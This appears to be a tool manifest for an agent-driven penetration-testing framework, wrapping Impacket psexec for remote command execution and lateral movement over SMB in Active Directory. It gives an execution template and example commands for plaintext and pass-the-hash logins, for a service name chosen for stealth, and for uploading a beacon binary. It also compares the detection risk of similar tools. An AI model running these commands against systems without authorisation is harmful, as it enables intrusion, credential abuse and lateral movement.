---
id: security-ad-psexec
namespace: security:ad:psexec
name: psexec
description: Impacket psexec — Windows remote command execution via SMB service
  control manager for lateral movement in Active Directory environments.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.lateral.psexec
  - security.shell.remote
  - security.execution.remote
  - security.ad.service.control
platforms:
  - linux
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies:
  - python3
  - impacket
related_tools:
  - impacket
  - evil-winrm
  - wmiexec
  - smbexec
phase: exploitation
techniques:
  - credential-access
  - discovery
  - lateral-movement
items:
  - NoCreds
  - Hash
services:
  - SMB
attack_types:
  - Enumeration
  - CredentialAccess
  - LateralMovement
contract:
  inputs:
    - type: network.target.ip
      description: Target IP address
    - type: credential.username
      description: Domain username (admin required)
    - type: credential.password
      description: Plaintext password or NTLM hash
  outputs:
    - type: security.shell.session
      description: Remote shell on target system
    - type: command.output
      description: Output of executed command
  side_effects:
    - network_traffic
    - process_spawn
    - filesystem_write
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 64
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 64
  network: low
  disk_io: low
allowed-tools:
  - psexec
parameters:
  - name: hashes
    type: string
    required: false
    description: "NTLM hash (LM:NT format) for pass-the-hash"
    aliases:
      - --hashes
  - name: kerberos
    type: boolean
    required: false
    default_value: false
    description: "Use Kerberos authentication"
    aliases:
      - -k
      - --kerberos
  - name: aesKey
    type: string
    required: false
    description: "AES256/128 key for Kerberos auth"
    aliases:
      - --aesKey
  - name: dc-ip
    type: string
    required: false
    description: "Domain controller IP for Kerberos"
    aliases:
      - --dc-ip
  - name: target-ip
    type: string
    required: false
    description: "Target IP address"
    aliases:
      - --target-ip
  - name: port
    type: integer
    required: false
    default_value: 445
    description: "SMB port number"
    aliases:
      - --port
  - name: service-name
    type: string
    required: false
    default_value: BTOBTO
    description: "Name of the service to create"
    aliases:
      - --service-name
  - name: codec
    type: string
    required: false
    default_value: utf-8
    description: "Output encoding codec"
    aliases:
      - --codec
  - name: debug
    type: boolean
    required: false
    default_value: false
    description: "Enable debug output"
    aliases:
      - --debug
  - name: no-pass
    type: boolean
    required: false
    default_value: false
    description: "Do not prompt for password"
    aliases:
      - --no-pass
  - name: file
    type: string
    required: false
    description: "Local file to execute remotely"
    aliases:
      - --file
  - name: share
    type: string
    required: false
    default_value: ADMIN$
    description: "SMB share for file upload"
    aliases:
      - --share
execution:
  template: "impacket-psexec {domain}/{user}:{password}@{target}"
  sandbox: execFile
  timeout_seconds: 300
  shell: false
global_vars:
  target: ip
  domain: domain
  user: user
examples:
  - description: "Interactive shell with plaintext credentials"
    command: impacket-psexec evilcorp.local/administrator:Pass123@10.10.10.1
  - description: "Pass-the-hash for interactive shell"
    command: impacket-psexec evilcorp.local/administrator@10.10.10.1 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
  - description: "Execute single command and exit"
    command: impacket-psexec evilcorp.local/administrator:Pass123@10.10.10.1 whoami
  - description: "Kerberos-based authentication"
    command: impacket-psexec evilcorp.local/administrator@10.10.10.1 -k -dc-ip 10.10.10.1 -no-pass
  - description: "Custom service name for stealth"
    command: impacket-psexec evilcorp.local/administrator:Pass123@10.10.10.1 -service-name LegitSvc
  - description: "Upload and execute a local binary"
    command: impacket-psexec evilcorp.local/administrator:Pass123@10.10.10.1 -file /tmp/beacon.exe
references:
  - label: "Impacket GitHub"
    url: "https://github.com/fortra/impacket"
install:
    - method: pip
      package_name: "impacket"
      commands:
        - "pip install impacket"
---

# psexec — Remote Command Execution via SMB

psexec (Impacket implementation) enables remote command execution on Windows systems by creating and starting a Windows service via SMB. It is Python-native and does not require any binaries on the target.

## How It Works

1. Connects to `ADMIN$` or specified share via SMB
2. Uploads a service binary (or generates one inline)
3. Creates a Windows service via the Service Control Manager
4. Starts the service, which executes the command
5. Captures stdout/stderr via SMB named pipes
6. Removes the service and cleans up

## Comparison with Other Impacket Exec Tools

| Tool | Technique | Detection Risk |
|------|-----------|----------------|
| **psexec** | Windows Service (SVCCTL) | High — service creation logged |
| **wmiexec** | WMI (DCOM) | Medium — event log 4688 |
| **smbexec** | Scheduled Task via SMB | Medium — task creation logged |
| **atexec** | Scheduled Task via AT | Lower — older technique |
| **dcomexec** | DCOM objects | Medium — depends on object |
